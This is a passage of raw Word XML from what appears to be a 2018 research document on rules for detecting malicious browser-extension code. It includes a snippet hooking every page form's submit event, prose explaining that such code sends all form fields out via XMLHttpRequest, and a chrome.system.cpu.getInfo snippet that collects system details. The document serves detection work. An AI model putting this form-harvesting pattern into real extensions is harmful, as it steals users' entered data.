                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>index</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>].</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>addEventListener</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>'submit'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>formSubmit</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5777C7BF" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="007652E7" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="0E65E42D" w14:textId="2CB020BC" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D"/>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 7: Form submit requests.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="191"/>
    </w:p>
    <w:p w14:paraId="2BD2F9D7" w14:textId="14C04EA9" w:rsidR="001175B2" w:rsidRPr="009E02A4" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="192" w:name="_Ref514844094"/>
      <w:bookmarkStart w:id="193" w:name="_Toc523071585"/>
      <w:r w:rsidRPr="009E02A4">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:t>: Information from submit requests.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="192"/>
      <w:bookmarkEnd w:id="193"/>
    </w:p>
    <w:p w14:paraId="57C78824" w14:textId="77777777" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="001175B2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">This rule is about malicious code that steals information from submit requests. An event listener is added for each form of the page visited by the user. When there is a submit event, the </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF5C04">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="194" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:44:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>formSubmit</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> function is triggered which creates an </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF5C04">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="195" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:44:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>XMLHttpRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> to send all the names and values of the form.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBEC185" w14:textId="77777777" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="196" w:name="_Toc523071521"/>
    <w:p w14:paraId="5D12C921" w14:textId="463F63B2" w:rsidR="001175B2" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251686912" behindDoc="0" locked="0" layoutInCell="0" allowOverlap="0" wp14:anchorId="109317FE" wp14:editId="30C20373">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>left</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>561340</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6181725" cy="2295525"/>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2295525"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="2C0F16C8" w14:textId="08E07A49" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>/**</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve"> * (system.cpu)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve"> * Find information about a user's system.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve"> */</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>chrome.system.cpu.getInfo(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>function</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(cpu){</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>// set html</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>document.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>getElementById</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>'cpu-model'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>).innerHTML = cpu.modelName</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>document.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>getElementById</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>'cpu-arch'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>).innerHTML = cpu.archName</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>document.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>getElementById</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>'num-processors'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>).innerHTML = cpu.numOfProcessors</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="26BFF519" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="4A860AE3" w14:textId="1B642AC5" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D">
                            <w:pPr>
                              <w:rPr>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9317FE" id="_x0000_s1037" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:44.2pt;width:486.75pt;height:180.75pt;z-index:2516869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" o:allowincell="f" o:allowoverlap="f" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="2C0F16C8" w14:textId="08E07A49" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>/**</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve"> * (</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>system.cpu</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve"> * Find information about a user's system.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve"> */</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>chrome.system.cpu.getInfo</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>function</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>cpu</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>){</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>// set html</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>document.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>getElementById</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>'</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>cpu</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>-model'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>).</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>innerHTML</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>cpu.modelName</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>document.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>getElementById</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>'</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>cpu</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>-arch'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>).</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>innerHTML</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
